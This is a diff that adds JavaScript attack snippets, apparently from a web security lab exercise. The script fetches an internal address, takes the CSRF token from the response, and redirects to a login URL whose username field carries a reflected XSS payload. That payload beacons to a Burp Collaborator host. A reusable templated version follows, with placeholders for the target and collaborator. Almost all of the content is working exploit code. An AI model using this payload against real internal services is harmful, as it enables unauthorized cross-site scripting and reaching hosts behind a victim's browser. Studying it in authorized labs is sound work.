@@ -1,0 +1,36 @@
+<script>
+    url_BurpCollab = 'https://c4hk4y6w4l6iu3x90vma3fbk7bd21r.oastify.com';
+
+    url = 'http://192.168.0.86:8080';
+
+    fetch(url)
+    .then(response => response.text())
+    .then(text =>{
+        try {
+            xss_vector = '"><img src='+url_BurpCollab+'?foundXss=1>';
+            login_path = '/login?username='+encodeURIComponent(xss_vector)+'&password=test&csrf=' + text.match(/csrf" value="([^"]+)"/);
+            location = url + login_path;
+
+        } catch (err) {
+
+        }
+    })
+</script>
+
+example code:
+<script>
+    function xss(url, text, vector) {
+        location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+    }
+    
+    function fetchUrl(url, collaboratorURL){
+        fetch(url).then(r => r.text().then(text => {
+            xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+        }))
+    }
+    
+    fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+
+=> success => xss => next step
+
